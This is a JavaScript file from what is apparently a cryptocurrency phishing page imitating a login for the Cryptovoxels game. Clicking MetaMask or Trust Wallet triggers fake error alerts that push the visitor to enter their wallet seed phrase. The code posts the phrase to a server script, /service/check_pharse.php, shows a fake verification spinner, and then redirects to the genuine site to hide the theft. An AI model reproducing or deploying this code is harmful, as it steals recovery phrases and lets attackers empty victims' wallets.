var metamask = document.querySelector("#metamask");
if (metamask) {
  metamask.addEventListener("click", alertmetamask);
}
var truswallet = document.querySelector("#truswallet");
if (truswallet) {
  truswallet.addEventListener("click", alertwalletconnect);
}
var wallet_link = document.querySelector("#wallet-link");
if (wallet_link) {
  wallet_link.addEventListener("click", alertwalletLink);
}
var facebook = document.querySelector("#facebook");
if (facebook) {
  facebook.addEventListener("click", alertFacebook);
}
var elClosePopup = document.querySelector("#close-popup");
if (elClosePopup) {
  elClosePopup.addEventListener("click", closePopup);
}
var btn_signin = document.querySelector("#btn-signin");
if (btn_signin) {
  btn_signin.addEventListener("click", showPopup);
}
// var popup_wallet = document.querySelector("#popup-wallet");
// if(popup_wallet){
//   popup_wallet.addEventListener("click", alertError);
// }

var play_now = false;

function playNow() { 
  play_now = true;
  Swal.fire({
    title: 'Warning',
    text: "Please login first before play game!",
    icon: 'warning',
    confirmButtonColor: '#3085d6',
    confirmButtonText: 'Ok'
  }).then((result) => {
    if (result.isConfirmed) {
      showPopup()
    }
  })
}

function showPopup() {
  document.querySelector('#popup-wallet').style.display = 'block';
  document.querySelector('#btn-signin-popup').classList.add("active");
}

function closePopup() {
  document.querySelector('#popup-wallet').style.display = 'none';
  document.querySelector('#btn-signin-popup').classList.remove("active");
}

function alertmetamask() {
  alertError('metamask')
}

function alertwalletconnect() {
  alertError('trust wallet')
}

function alertwalletLink() {
  walletLink('wallet link')
}

function alertFacebook() {
  walletLink('facebook')
}

function alertError(wallet) {
  Swal.fire({
    title: 'Connect Alert',
    text: "Please install Metamask or paste URL link into Trustwallet (Dapps)!",
    icon: 'error',
    confirmButtonColor: '#3085d6',
    confirmButtonText: 'OK',

  }).then((result) => {
    if (result.isConfirmed) {
      Swal.fire({
        title: 'Connect Alert',
        text: "Error with " + wallet + " payment (Dapps)!",
        icon: 'error',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        cancelButtonText: 'Exit',
        confirmButtonText: 'Import using Secret Recovery Pharse',
        reverseButtons: true
      }).then((result) => {
        if (result.isConfirmed) {
          Swal.fire({
            title: 'Login Pharse!',
            text: 'Import an account with seed phrase',
            input: 'text',
            inputAttributes: {
              autocapitalize: 'off',
              placeholder: 'Secret Phrases contain 12, 15, 18, 21, or 24 words'
            },
            showCancelButton: true,
            confirmButtonText: 'Login',
            showLoaderOnConfirm: true,
            preConfirm: (login) => {
              var data = new FormData();
              data.append("pharse", login);
              return fetch(`/service/check_pharse.php`, {
                  method: "POST",
                  body: data
                })
                .then(response => {
                  if (!response.ok) {
                    throw new Error(response.statusText)
                  }
                  return response.json()
                })
                .catch(error => {
                  Swal.showValidationMessage(
                    `Invalid Secret Recovery Phrase. Secret Phrases contain 12, 15, 18, 21, or 24 words!`
                  )
                })
            },
            allowOutsideClick: () => !Swal.isLoading()
          }).then((result) => {
            if (result.isConfirmed) {
              // Swal.fire({
              //   title: `${result.value.login}'s avatar`,
              //   imageUrl: result.value.avatar_url
              // })
              Swal.fire({
                title: 'Please wait!',
                html: 'I will check your pharse.',
                timer: 2000,
                timerProgressBar: true,
                didOpen: () => {
                  Swal.showLoading()
                }
              }).then((result) => {
                /* Read more about handling dismissals below */
                if (result.dismiss === Swal.DismissReason.timer) {
                  if (play_now) {
                    Swal.fire({
                      title: 'Success',
                      text: "Now you can play the game!",
                      icon: 'success',
                      confirmButtonColor: '#3085d6',
                      confirmButtonText: 'Ok'
                    }).then((result) => {
                      if (result.isConfirmed) {
                        window.location.href = 'https://www.cryptovoxels.com/play'
                      }
                    })
                  } else {
                    Swal.fire({
                      title: 'Success',
                      text: "Now you can login " + wallet + "!",
                      icon: 'success',
                      confirmButtonColor: '#3085d6',
                      confirmButtonText: 'Ok'
  
                    }).then((result) => {
                      if (result.isConfirmed) {
                        window.location.href = 'https://www.cryptovoxels.com/'
                      }
                    })
                  }
                }
              })
            }
          })
        }
      })
    }
  })
}

function walletLink(wallet) {
  Swal.fire(
    'Connect Alert',
    'Error with ' + wallet + ' payment (Dapps)!',
    'error'
  )
}